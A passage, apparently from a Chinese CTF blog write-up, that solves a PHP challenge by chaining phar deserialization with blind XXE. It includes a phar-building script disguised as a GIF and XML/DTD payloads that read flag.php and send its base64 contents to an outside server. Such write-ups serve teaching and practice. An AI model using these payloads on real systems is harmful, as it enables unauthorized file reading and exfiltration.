class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">lI1111</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/file|\.\.|flag/i"</span>, <span class="keyword">$this</span>-&gt;ll1lIl)) &#123; 不能直接读flag.php</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="keyword">$this</span>-&gt;ll1lIl))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;lI1111()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'I\'m not stupid!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"data:"</span>.mime_content_type(<span class="keyword">$this</span>-&gt;ll1lIl).<span class="string">";charset=utf-8;base64,"</span>;</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(file_get_contents(<span class="keyword">$this</span>-&gt;ll1lIl)); <span class="comment">// 读取文件内容</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\" \\&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该类限制了get传入的<code>args</code>的值，使其不能直接读flag.php。并用<code>file_exists()</code>判断图片是否存在，如果图片存在且无黑名单字符，则用<code>file_get_contents()</code>读取文件内容。<br>这里的两个php中的文件系统函数<code>file_exists()</code>和<code>file_get_contents()</code>都会造成phar反序列化。php中的一部分函数在通过phar://伪协议解析phar文件时，都会将<code>meta-data</code>进行反序列化。<br>ref: <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>1.通过<code>OOOo0Oo0</code>类上传phar文件，拿到文件地址。<br>2.通过<code>oOO0000O</code>类查看phar文件，当调用<code>file_exists()</code>时触发反序列化漏洞。<br>3.因为<code>o0Ooo0oO</code>类对<code>$ll1lIl</code>的判断是在构造函数中的，所以反序列化该类不会进行判断，并会在析构函数中调用<code>__call()</code>方法实现利用。<br>4.在<code>__call()</code>方法中实例化<code>SimpleXMLElement</code>类，通过blind xxe读取flag.php文件内容。</p>
+<p><code>SimpleXMLElement::__construct()</code>如下：<br><img src="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/4.png" alt="2"><br>这里要通过给<code>SimpleXMLElement</code>类的构造函数传入3个参数将其实例化<br>即<code>$exp = new SimleXMLElemnt(string $data, LIBXML_NOENT, true);</code><br>1.$data，xml的内容。<br>2.$option，传入LIBXML_NOENT或2，解决了libxml&gt;=2.9之后默认不解析外部实体。<br>3.$data_is_url，指定$data为xml文件的url。</p>
+<p>调用<code>__call()</code>时，取的是<code>$lI1111</code>数组中的第一位。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=$class-&gt;newInstanceArgs($lI1111[<span class="number">0</span>]?$lI1111[<span class="number">0</span>]:<span class="keyword">array</span>());</span><br></pre></td></tr></table></figure></p>
+<p>看一下<code>__call()</code>方法：<br><img src="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/5.png" alt="3"></p>
+<p><code>__call()</code>方法会将对不存在的方法调用时传入的参数按顺序放入一个新的数组里面。<br>栗子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span> </span>&#123;</span><br><span class="line">		print_r($arguments); <span class="comment">// 将传入的参数</span></span><br><span class="line">		<span class="keyword">echo</span> $name; <span class="comment">// 调用不存在的方法的方法名 </span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'  '</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$test-&gt;funcname(<span class="string">"ll"</span>,  <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">$test-&gt;funcname(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/6.png" alt="4"><br>这里在<code>o0Ooo0oO</code>类中虽然只传入了<code>$this-&gt;lI1111</code>，但是它会变成新生成的参数数组的第一项，即<code>__call()</code>中的<code>$lI1111[0]</code>。成功传入<code>SimpleXMLElement::__construct()</code>中。</p>
+<p>生成phar文件1.gif。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">o0Ooo0oO</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ll1lIl;</span><br><span class="line">    <span class="keyword">private</span> $lI1111;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ll1lIl, $lI1111)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ll1lIl = $ll1lIl;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lI1111 = $lI1111;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">new</span> o0Ooo0oO(<span class="string">'SimpleXMLElement'</span>,<span class="keyword">array</span>(<span class="string">'http://104.194.71.17/evil.xml'</span>, <span class="number">2</span>, <span class="keyword">true</span>));</span><br><span class="line"><span class="keyword">echo</span> serialize($exp);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">// 增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($exp);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>,<span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">"1.phar"</span>, <span class="string">"1.gif"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>evil.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ll [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % x SYSTEM "http://104.194.71.17/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%x;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ll</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">ll</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>evil.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://104.194.71.17/%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>上传phar文件1.gif，得到服务端文件名。<br><img src="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/7.png" alt="5"><br>通过查看图片的<code>oOO0000O</code>类中的<code>file_exists()</code>函数触发phar反序列化，并通过<code>SimpleXMLELement</code>类实现blind xxe，将flag.php的内容发至我的服务器。<br><a href="http://58.87.73.74:8082/do.php?module=oOO0000O&amp;args[]=phar:///var/www/html/upload/5884397d46150457dced4725ce59299a14192dfb.gif/test.jpg" target="_blank" rel="noopener">http://58.87.73.74:8082/do.php?module=oOO0000O&amp;args[]=phar:///var/www/html/upload/5884397d46150457dced4725ce59299a14192dfb.gif/test.jpg</a><br>查看服务端日志，得到flag.php。<br><img src="https://raw.githubusercontent.com/LLfam/LLfam.github.io/master/picture/2019%E5%8C%97%E9%82%AE/8.png" alt="6"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这题主要考了phar反序列化和blind xxe，正好把之前学的这两个漏洞复习了一遍。<br>xxe中如果在读取php文件时，因为php、html等文件中有各种括号<code>&lt;</code>、<code>&gt;</code>，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。</p>
+<p>ref: <a href="https://www.anquanke.com/post/id/170299" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170299</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ll</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#annoying-class"><span class="nav-number">1.</span> <span class="nav-text">annoying class</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#代码审计"><span class="nav-number">1.1.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload"><span class="nav-number">1.2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ll</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
